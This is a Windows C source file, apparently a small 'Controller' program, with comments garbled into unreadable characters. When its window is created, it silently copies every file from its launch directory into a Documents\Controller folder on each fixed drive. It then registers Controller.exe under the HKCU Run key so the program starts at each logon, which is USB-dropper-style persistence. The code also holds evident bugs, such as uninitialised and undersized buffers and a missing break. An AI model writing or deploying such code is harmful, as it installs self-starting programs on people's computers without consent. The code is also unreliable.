#include <Windows.h>
#include <winreg.h>
#include <direct.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>

#define DEBUG
#define BUF_SIZE 256

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
HINSTANCE g_hInst;
LPCTSTR lpszClass = TEXT("Test");
void Regedit(TCHAR *path);


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow)
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	g_hInst = hInstance;

	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW;
	RegisterClass(&WndClass);

	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, (HMENU)NULL, hInstance, NULL);


	while (GetMessage(&Message, NULL, 0, 0))
	{
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}
	return (int)Message.wParam;
}


LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
{
	SHFILEOPSTRUCT fo;
	TCHAR Username[10];
	DWORD Userlen;
	int ch;
	TCHAR Path[10];
	TCHAR C_Path[BUF_SIZE]; //controller ���


	switch (iMessage)
	{

	case WM_CREATE :

		GetUserName(Username, &Userlen);

		for (ch = 'a';ch <= 'z';ch++) {

			
			memset(C_Path, 0, BUF_SIZE);
			wsprintf(Path, _T("%c:\\"), ch);

			if (GetDriveType(Path) == DRIVE_FIXED)//����̺� ����
			{
				wsprintf(C_Path, _T("%sUsers\\%s\\Documents\\Controller"), Path, Username);
				

				if (_wmkdir(C_Path) == -1)//������ �����޴ٸ� �ش��δ� ������������ �ǳʶڴ�.
					continue;

				fo.hwnd = hWnd;
				fo.wFunc = FO_COPY;
				fo.pFrom = _T("./*");
				fo.pTo = C_Path;
				fo.fFlags = FOF_SILENT | FOF_NOCONFIRMATION;
				if (SHFileOperation(&fo) != 0) {//���μ�����ġ�� ��������� usb�� ����
#ifdef DEBUG
					MessageBox(hWnd, _T("First SHFileOperation Error!"), _T("Error"), MB_OK);
#endif				
				}
				Regedit(C_Path);
			}
		}


	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return (DefWindowProc(hWnd, iMessage, wParam, lParam));
}

void Regedit(TCHAR *path)
{
	int ret;
	HKEY hkey;
	TCHAR C_Path[BUF_SIZE] = { 0, };

	ret = RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hkey);//��������Ʈ ���� �� �ý��ۿ� ��� �������α׷����� ����ϴ� �����. 

	if (ret == ERROR_SUCCESS)
	{
		
		wsprintf(C_Path, _T("%s\\Controller.exe"), path);
		RegSetValueEx(hkey, TEXT("Controller"), 0, REG_SZ, (BYTE*)C_Path,BUF_SIZE);//��������Ʈ�� ���α׷� ��ϼ���
	}

	RegCloseKey(hkey);

}